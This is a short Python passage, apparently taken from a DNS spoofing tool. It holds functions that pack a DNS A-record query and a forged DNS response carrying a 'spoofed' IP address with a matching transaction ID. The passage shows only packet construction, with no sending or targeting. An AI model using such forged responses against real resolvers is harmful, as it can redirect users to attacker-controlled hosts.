def craft_dns_query(hostname):
    """
    Craft a DNS query packet for the given hostname.
    This is a simplified DNS query for an A record.
    """
    # DNS Header
    transaction_id = random.randint(0, 65535)
    flags = 0x0100  # Standard query with recursion desired
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 0

    header = struct.pack('!HHHHHH', transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)

    # DNS Question
    question = b''
    for part in hostname.split('.'):
        question += struct.pack('B', len(part)) + part.encode()
    question += b'\x00'  # Null terminator
    question += struct.pack('!HH', 1, 1)  # Type A, Class IN

    return header + question, transaction_id

def craft_dns_response(hostname, ip_address, transaction_id):
    """
    Craft a DNS response packet with the spoofed IP address.
    """
    # DNS Header
    flags = 0x8180  # Standard response, recursion desired, recursion available
    questions = 1
    answer_rrs = 1
    authority_rrs = 0
    additional_rrs = 0

    header = struct.pack('!HHHHHH', transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)

    # DNS Question (echo the query)
    question = b''
    for part in hostname.split('.'):
        question += struct.pack('B', len(part)) + part.encode()
    question += b'\x00'
    question += struct.pack('!HH', 1, 1)  # Type A, Class IN

    # DNS Answer
    answer = b''
    answer += b'\xc0\x0c'  # Pointer to the question name
    answer += struct.pack('!HH', 1, 1)  # Type A, Class IN
    answer += struct.pack('!I', 300)  # TTL (300 seconds)
    answer += struct.pack('!H', 4)  # RDLENGTH (4 bytes for IPv4)
    answer += socket.inet_aton(ip_address)  # IP address

    return header + question + answer

